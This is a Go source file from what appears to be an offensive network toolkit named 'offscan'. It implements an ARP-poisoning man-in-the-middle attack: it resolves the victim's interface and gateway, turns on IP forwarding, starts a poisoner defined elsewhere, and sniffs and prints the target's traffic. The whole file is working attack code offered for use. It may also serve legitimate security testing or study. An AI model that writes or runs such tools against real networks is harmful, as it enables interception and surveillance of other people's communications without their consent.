/*
 * Copyright (C) 2025 Oliver R. Calazans Jeronimo
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org>.
 */

package arppoison

import (
	"context"
	"fmt"
	"net"
	"offscan/internal/ifaceinfo"
	"offscan/internal/netroute"
	"offscan/internal/packet/builder"
	"offscan/internal/packet/dissector"
	"offscan/internal/sniffer"
	"offscan/internal/sockets"
	"offscan/internal/sysinfo"
	"os"
	"os/signal"
	"sync"
	"syscall"
)



type arpPoison struct {
	iface       net.Interface
	targetIP    net.IP
	targetMAC   net.HardwareAddr
	apIP        net.IP
	apMAC	    net.HardwareAddr
	builder    *builder.ArpPacket
	socket      sockets.Layer2Socket
	sniffer    *sniffer.Sniffer
	ctx         context.Context
	cancel      context.CancelFunc
	dissec     *dissector.PacketDissector
	wg          sync.WaitGroup
}



func Run(args []string) {
    newArpPoison(args).execute()
}



func newArpPoison(args []string) *arpPoison {
	parser := newParser()
	parser.parseArpPoisonArgs(args)

	iface := netroute.MustRouteIfaceForDstIP(parser.targetIP)

	return &arpPoison{
		iface     : iface,
		targetIP  : parser.targetIP,
		targetMAC : parser.targetMAC,
		apIP      : ifaceinfo.MustGatewayIP(&iface),
		apMAC     : ifaceinfo.MustGatewayMAC(&iface),
	}
}



func (ap *arpPoison) execute() {
	sysinfo.MustEnableIPForwarding()
	ap.initSniffTools()
	ap.startPoisoner()
	ap.sniffTargetsTraffic()
}



func (ap *arpPoison) initSniffTools() {
	ap.sniffer = sniffer.NewSniffer(ap.iface, ap.getBPFFilter(), false)
	ap.dissec  = dissector.NewPacketDissector()
	ap.createCtx()
}



func (ap *arpPoison) getBPFFilter() string {
	return fmt.Sprintf("host %s", ap.targetIP.String())
}



func (ap *arpPoison) createCtx() {
    ap.ctx, ap.cancel = context.WithCancel(context.Background())

	go func() {
        sigCh := make(chan os.Signal, 1)
        signal.Notify(sigCh, os.Interrupt, syscall.SIGTERM)
        <-sigCh
        fmt.Println("\n[!] Interrupt received. Stopping...")
        ap.cancel()
    }()
}



func (ap *arpPoison) sniffTargetsTraffic() {
	sniffCh := ap.sniffer.Start()

	for {
		select {
		case <- ap.ctx.Done():
			return

		default:
			pkt, ok := <-sniffCh
			if !ok { return }
			ap.processPkt(pkt)
		}
	}
}



func (ap *arpPoison) processPkt(pkt []byte) {
	ap.dissec.UpdatePkt(pkt)
	
	srcIP, ok1 := ap.dissec.GetSrcIP()
	if !ok1 { return }
	
	dstIP, ok2 := ap.dissec.GetDstIP()
	if !ok2 { return }

	fmt.Printf("%s -> %s", srcIP.String(), dstIP.String())
}